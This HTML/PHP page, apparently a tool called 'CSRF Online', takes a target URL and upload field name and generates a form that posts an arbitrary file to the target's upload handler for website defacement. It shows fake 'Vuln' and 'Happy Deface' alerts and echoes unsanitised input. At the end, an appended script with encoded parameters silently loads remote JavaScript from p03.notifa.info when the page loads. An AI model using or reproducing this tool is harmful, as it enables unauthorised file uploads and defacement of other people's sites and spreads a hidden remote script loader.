<html>
    <head>
	<iframe width="0" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/302993013&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
        <title>CSRF Online</title>
         <link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet"> 
         <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" type="text/css">
         <link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel="stylesheet" type="text/css"> 
         <meta content='CSRF Online' name='title'/>
         <meta content='CSRF Online' name='description'/>
         <meta content='CSRF Online' name='keywords'/>
         <meta content='CSRF Online' name='Abstract'/>
         <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
          <link rel="icon" type="image/png" href="https://cdn.pixabay.com/photo/2013/07/13/13/41/bash-161382_960_720.png">
             <br>
                <br>
                   <br>
                      <body style="background-color: rgb(0, 0, 0); color: rgb(0, 0, 0);"alink="#ee0000" link="#0000ee" vlink="#551a8b">
                         <span style="color: rgb(242, 239, 239);">
                            <br>
                               <span style="font-family: monospace;"></head>
                               <center> 
                               <div class="error">
                                  <img border="0" src="https://1.bp.blogspot.com/-Um9UjXjVTEg/WQUeHug4BvI/AAAAAAAAMYE/Rkq54qpv0bc1oNYUuJwtdGtKnxXio1dKwCEw/s320/logo%20dream%20league%20soccer%20one%20piece%20ace.png" width="250" height="">
                                     <br>
                                        <font size="4" face="Terminal">
                                      <br>                                                                         </br>
                                           <font size="4" face="Terminal">
                                              
                                           </font></p>
                                           <font size="7" face="Open Sans Condensed">&#1203;&#824;&#1202;&#824;&#1203; CSRF Online &#1203;&#824;&#1202;&#824;&#1203;</font>
                                           </p>
                                           <font size="4" face="Ubuntu Mono"></font></p>
                                           <font size="4" face="Ubuntu Mono">#CSRF Online#</font></p>
                                           <font size="4" face="Ubuntu Mono">Hopefully Your Target Vuln</font></p>
                                           <br>
                                <div style="display">		
                                               <center>
<form method="post">
<font face="Inconsolata" color="white"> URL Target : </font> <font color="red"> &#1203;&#824;&#1202;&#824;&#1203; </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
<br><br><font face="Inconsolata" color="white"> Post File : </font> <font color="red">&#1203;&#824;&#1202;&#824;&#1203; </font><font color="black">-</font>  <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
<br><br><input type = "submit" name = "submit" value = "Target Key" class="login-input"style='width: 130px; height: 40px;'> </ form >
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['submit'];
if($d) {
	echo "<SCRIPT language='JavaScript'>alert('URL Target Is Vuln');</SCRIPT>";
    echo "<SCRIPT language='JavaScript'>alert('Upload Your File');</SCRIPT>";
	echo "<SCRIPT language='JavaScript'>alert(' Status : Terkunci');</SCRIPT>";
    echo "<SCRIPT language='JavaScript'>alert('Akses Your File');</SCRIPT>";
    echo "<SCRIPT language='JavaScript'>alert('Edit Page Index Done');</SCRIPT>";
    echo "<SCRIPT language='JavaScript'>alert('Miror -> Ok');</SCRIPT>";
    echo "<SCRIPT language='JavaScript'>alert('Happy Deface';</SCRIPT>";
    echo " <div id='preloader'> ";
    echo " <div id='loading'> ";
    echo " </div> </div> ";
    echo " <div class='content'> ";
    echo " </div> ";
	echo "<img src='https://4.bp.blogspot.com/-Q9KIU7LpNSM/WQUeCRx_blI/AAAAAAAAMYE/U2fFeHb33t0f_CnxOffat_vH3WFVUk6kACEw/s320/logo%2Bdream%2Bleague%2Bsoccer%2Banime%2Bzorro.png' style='width: 120px; height: 80px';>";
	echo "<br>";
        echo " <font face='Inconsolata' color='red'> $url  Status -> </font> <font face='Inconsolata' color='green'> Locked </font> ";
        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><font face='Inconsolata' color='white'> Filename : </font><font color=black>&#1203;&#824;&#1202;&#824;&#1203;</font><input type='file' name='$pf'><input type='submit' name='submit' value=' Fire!!!' class='login-input' style='width: 120px; height: 42px;'></form";
}
?>
</form>
<script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
    <script type="text/javascript">
  $(window).load(function() {
   $("#content").fadeOut();
   $("#preloader").delay(10).fadeOut("slow");
  })
    </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m1yEw0Zhss6dvuHT13xMZiBN37rSBhkrd%2fCI6B%2fO93ucRMvQCK4bk0WK%2bjVW9CZiim%2buqGrq0rZWmRqTaXCl13wBkXBaFmn5VyZYrEN%2brCEiUUv6PpHM%2fO5GRaJa2GVhiytVD8xjnt2oLcufZ12xvW1ulina2Rp%2fKFtFfU2SOAaIpMUNhsEmcAANAx2xbX0gOAEQ39FTx4l%2b0avPk9KlsWYDybRimp4YVR4x8vs8IvKwzsnHbA4dlWic8yZqScxxsiZE7U7iKfHuK%2fLHrPzq16ygpWj2dgoty%2fPbhMCbBJ%2bSGQdnm41dFpHbMOGKCs1X4kALbvo7%2ftcjaSsFbm0rhPdmmhoNlTYzqlUzBbkmagEbYz7suV%2buW3HhiNKdlobKcd7TUXRwV2tuumevdkz6ByjBcGh%2fc%2brHEE%2fvTuIcIk0NZbLPmDVwqbIWaWC7eeWDiuPN7cuMK%2fUHyQtdhDdTFbdyu7aa7XDtY7P3ptscirhAEN7wf3287hvdZJzqCj1clRB1X1N9EaytwJv3rBiqZJESyMLFie3VfNGJGpwGfypQCe%2bX4jNF5KYKZNxbbqFAK8rjFbeqRT%2fdTawUgcFBBww%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>